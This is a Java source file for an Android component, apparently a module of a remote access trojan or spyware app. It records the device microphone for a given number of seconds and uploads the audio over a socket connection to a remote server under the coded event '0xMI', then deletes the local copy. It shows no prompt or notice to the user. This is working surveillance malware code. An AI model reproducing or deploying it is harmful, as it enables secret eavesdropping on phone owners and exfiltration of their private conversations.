package com.example.micmanager;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import com.example.commoninterfaces.IOSocket;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public  class MicManager {
    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;

    public static void startRecording(int sec, Context context) throws Exception {
        //Creating file
        File dir = context.getCacheDir();
        try {
            Log.e("DIRR", dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }

        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();
                sendVoice(audiofile, context);
                //noinspection ResultOfMethodCallIgnored
                audiofile.delete();
            }
        };

        new Timer().schedule(stopRecording, sec * 1000L);
    }

    private static void sendVoice(File file, Context context) {
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            //noinspection ResultOfMethodCallIgnored
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            new IOSocket(context).getIoSocket().emit("0xMI", object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}

